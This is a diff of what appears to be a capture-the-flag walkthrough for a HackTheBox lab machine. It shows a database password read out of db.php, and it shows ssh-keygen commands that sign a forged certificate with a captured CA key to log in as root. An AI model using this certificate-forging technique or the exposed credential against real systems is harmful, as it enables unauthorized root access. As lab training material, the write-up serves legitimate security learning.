@@ -81,7 +81,6 @@ ticket_section.inc.php
 uploads
 $ cat db.php    
 <?php
-
 $dsn = "mysql:host=db;dbname=resourcecenter;";
 $dbusername = "jj";
 $dbpassword = "ugEG5rR5SG8uPd";
@@ -124,13 +123,13 @@ When i was www-data i noted that was a port listening on 127.0.0.11, this usuayl
 RABBIT HOLE, try hard on SSH: https://shivamaharjan.medium.com/ssh-cas-and-principals-630a433d76d6
 
 ```
-ssh-keygen -t ecdsa -C "The CA" -N "" -f shiva
-ssh-keygen -s ./ca-itrc -I CA-signing -n msainristil,zzinter,root -V +1w -z 1 ./shiva.pub
+ssh-keygen -t ecdsa -C "The CA" -N "" -f root_key
+ssh-keygen -s ./ca-itrc -I CA-signing -n msainristil,zzinter,root -V +1w -z 1 ./root_key.pub
 
 Copy with scp generated files and:
 
 ──(kali㉿kali)-[~/HTB/Resource]
-└─$ ssh -o CertificateFile=shiva-cert.pub -i shiva root@10.10.11.27            
+└─$ ssh -o CertificateFile=root_key-cert.pub -i root_key root@10.10.11.27            
 Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -142,7 +141,7 @@ permitted by applicable law.
 root@itrc:~# ls
 ```
 
-Even if we logged as root, we don't have nothing here.
+Even if we logged as root, there's no root flag, so download **sign_key_api.sh** file.
 
 ![](attachment/09598aa1ce18ac9b5f233eecf3a06a09.png)
 
@@ -151,7 +150,7 @@ Go back in msainristil SSH:
 ![](attachment/b4223d8b25ba9e87781b1b3c05157fee.png)
 
 
-Run these commands to generate ssh keypair and sign them with **ca-itrc** SSH certificate
+Run these commands to generate ssh keypair again and sign them with **ca-itrc** SSH certificate
 
 ```
 ssh-keygen -t rsa -b 2048 -f keypair
